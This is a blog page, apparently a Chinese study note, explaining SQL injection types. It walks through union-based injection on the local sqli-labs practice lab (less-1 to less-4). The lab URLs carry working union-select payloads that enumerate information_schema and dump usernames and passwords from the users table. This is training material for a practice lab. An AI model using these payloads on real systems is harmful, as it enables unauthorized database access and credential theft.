@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="yanm1ng&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      SQL | SY
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+  
+    
+<script src="/js/local-search.js"></script>
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>SY</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/series/" class="item-link">Series</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+      
+        <li class="menu-item menu-item-search right-list">
+    <a role="button" class="popup-trigger">
+        <i class="fa fa-search fa-fw"></i>
+    </a>
+</li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/series/" class="menu-link">Series</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+    
+      <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+            <span class="search-icon">
+                <i class="fa fa-search"></i>
+            </span>
+            <div class="search-input-container">
+                <input autocomplete="off" autocapitalize="off"
+                    placeholder="Please enter your keyword(s) to search." spellcheck="false"
+                    type="search" class="search-input">
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa fa-times-circle"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+    
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>SQL</h2>
+  <p class="post-date">2021-10-19</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="sql注入的类型"><a href="#sql注入的类型" class="headerlink" title="sql注入的类型"></a>sql注入的类型</h1><h2 id="按回显方式划分"><a href="#按回显方式划分" class="headerlink" title="按回显方式划分"></a>按回显方式划分</h2><h4 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h4><ul>
+<li><p>联合查询  ：构造联合查询语句，直接查看结果。</p>
+</li>
+<li><p>报错注入 ： 构造报错语句，在报错中查看结果。</p>
+</li>
+<li><p>堆查询   ： 多行语句执行，进而实现想要达到的目的。</p>
+</li>
+</ul>
+<h4 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h4><ul>
+<li><p>报错注入</p>
+</li>
+<li><p>盲注（sql注入中最重要的部分，几乎占sql题目的4/5）：通过某种手段爆破结果。</p>
+<ol>
+<li><p>布尔型</p>
+</li>
+<li><p>时间型</p>
+</li>
+</ol>
+</li>
+</ul>
+<hr>
+<h1 id="三大注入的基本步骤"><a href="#三大注入的基本步骤" class="headerlink" title="三大注入的基本步骤"></a>三大注入的基本步骤</h1><ul>
+<li><h4 id="联合查询注入步骤"><a href="#联合查询注入步骤" class="headerlink" title="联合查询注入步骤"></a>联合查询注入步骤</h4><p>当 id 的数据在数据库中不存在时，（此时我们可以 id=-1（非正数（负数或0），浮点数，字符型或字符串都行）<br>，两个 sql 语句进行联合操作时，<br>当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来）此处前台页面返<br>回了我们构造的 union 。</p>
+<ol>
+<li><p><strong>首先确定字段数。</strong>使用order/group by 语句。（注：若错误界面和正常界面无区别，则为无回显）</p>
+</li>
+<li><p><strong>判断界面回显的数据的字段位置。</strong> 使用 union select 1,2,3,x…（拼凑的字段数要足够多，不然会报错） 通过数字在界面上的显示可以判断界面显示的字段位置。若界面有回显却无我们定义的数字，需要将前面的select 语句查询结果返回为空即可。</p>
+</li>
+<li><p><strong>在显示的字段位置使用子语句来查询数据，或直接查询。</strong>首先查询当前数据库名database(),数据库账号user(),数据库版本version()等基本情况。以下为一些需要知道的信息：</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">information_schema.shemata (存储全部的数据库名)</span><br><span class="line">information_schema.tables (存储群全部数据表信息) 其中table_name (该字段保存其名称)，table_schema(保存其对应的数据库名)</span><br><span class="line">information_schema.columns(查询对应的数据库&#x2F;数据库表含有的字段名)</span><br></pre></td></tr></table></figure>
+
+<p>查询步骤即：<strong>查库名-&gt;查表名-&gt;查字段名-&gt;查数据</strong></p>
+<h5 id="以下以sql-labs-less-1—less-4-来演示联合查询注入"><a href="#以下以sql-labs-less-1—less-4-来演示联合查询注入" class="headerlink" title="以下以sql-labs less-1—less-4 来演示联合查询注入"></a>以下以sql-labs less-1—less-4 来演示联合查询注入</h5></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">less-1：</span><br><span class="line"></span><br><span class="line"> http: &#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;less-1&#x2F;?id&#x3D;1’ 查看是否注入</span><br><span class="line"></span><br><span class="line"> http: &#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;less-1&#x2F;?id&#x3D;1’ order by 3 --+ 查看有多少列（order by 4 回显错误即有三列）</span><br><span class="line"></span><br><span class="line"> http: &#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;less-1&#x2F;?id&#x3D;-1’ union select 1,2,3 --+ 判断回显的字段位置。</span><br><span class="line"></span><br><span class="line"> http: &#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;less-1&#x2F;?id&#x3D;-1’ union select 1,2,database() --+ 查看当前数据库</span><br><span class="line"></span><br><span class="line"> http: &#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;less-1&#x2F;?id&#x3D;-1’ union select</span><br><span class="line"></span><br><span class="line"> 1,2,group_concat(schema_name) from information_schema.schemata --+ 查看所有的数据库</span><br><span class="line"></span><br><span class="line"> http: &#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;less-1&#x2F;?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables wher</span><br><span class="line"></span><br><span class="line">e table_name &#x3D; 0x7365637572697479 –+ (0x7365637572697479为数据库security的16进制)</span><br><span class="line"></span><br><span class="line"> http: &#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;less-1&#x2F;?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273 –+(0x7573657273为数据库表名users的16进制)</span><br><span class="line"></span><br><span class="line"> http: &#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;less-1&#x2F;?id&#x3D;-1’ union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users –+直接可以得到所以的账号密码，并且使用~符号进行分割。 （0x7e为‘~’的16进制表示）</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="less-1-less-4-方法与less1一致，只有略微的差别。通过源码可以得知less-1为‘字符型注入，less-2为数字型注入，less-2为’）字符型注入，less-4为“）字符型注入。以下不再一一演示。"><a href="#less-1-less-4-方法与less1一致，只有略微的差别。通过源码可以得知less-1为‘字符型注入，less-2为数字型注入，less-2为’）字符型注入，less-4为“）字符型注入。以下不再一一演示。" class="headerlink" title="less-1-less-4:方法与less1一致，只有略微的差别。通过源码可以得知less-1为‘字符型注入，less-2为数字型注入，less-2为’）字符型注入，less-4为“）字符型注入。以下不再一一演示。"></a>less-1-less-4:方法与less1一致，只有略微的差别。通过源码可以得知less-1为‘字符型注入，less-2为数字型注入，less-2为’）字符型注入，less-4为“）字符型注入。以下不再一一演示。</h4></section>
+    <!-- Tags START -->
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2021/10/17/hello-world/">
+        <span class="nav-arrow">← </span>
+        
+          Hello World
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2021/10/20/%E5%88%9D%E8%AF%86MySQL/">
+        
+          初识MySQL
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Utterances START -->
+      <div id="utterances"></div>
+      <script src="https://utteranc.es/client.js"
+        repo=""
+        issue-term="pathname"
+        theme="github-light"
+        crossorigin="anonymous"
+        async></script>    
+      <!-- Utterances END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-nav-text">sql注入的类型</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%8C%89%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F%E5%88%92%E5%88%86"><span class="toc-nav-text">按回显方式划分</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-nav-text">有回显</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-nav-text">无回显</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#%E4%B8%89%E5%A4%A7%E6%B3%A8%E5%85%A5%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4"><span class="toc-nav-text">三大注入的基本步骤</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4"><span class="toc-nav-text">联合查询注入步骤</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E4%BB%A5%E4%B8%8B%E4%BB%A5sql-labs-less-1%E2%80%94less-4-%E6%9D%A5%E6%BC%94%E7%A4%BA%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-nav-text">以下以sql-labs less-1—less-4 来演示联合查询注入</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#less-1-less-4-%E6%96%B9%E6%B3%95%E4%B8%8Eless1%E4%B8%80%E8%87%B4%EF%BC%8C%E5%8F%AA%E6%9C%89%E7%95%A5%E5%BE%AE%E7%9A%84%E5%B7%AE%E5%88%AB%E3%80%82%E9%80%9A%E8%BF%87%E6%BA%90%E7%A0%81%E5%8F%AF%E4%BB%A5%E5%BE%97%E7%9F%A5less-1%E4%B8%BA%E2%80%98%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%8Cless-2%E4%B8%BA%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%8Cless-2%E4%B8%BA%E2%80%99%EF%BC%89%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%8Cless-4%E4%B8%BA%E2%80%9C%EF%BC%89%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E3%80%82%E4%BB%A5%E4%B8%8B%E4%B8%8D%E5%86%8D%E4%B8%80%E4%B8%80%E6%BC%94%E7%A4%BA%E3%80%82"><span class="toc-nav-text">less-1-less-4:方法与less1一致，只有略微的差别。通过源码可以得知less-1为‘字符型注入，less-2为数字型注入，less-2为’）字符型注入，less-4为“）字符型注入。以下不再一一演示。</span></a></li></ol></li></ol></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2021/10/19/SQL/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', '/css/images/error_icon.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== '/css/images/error_icon.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2021 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a target="_blank" rel="noopener" href="https://github.com/yanm1ng">yanm1ng</a>
+    
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      hljs.configure({useBR: true});
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
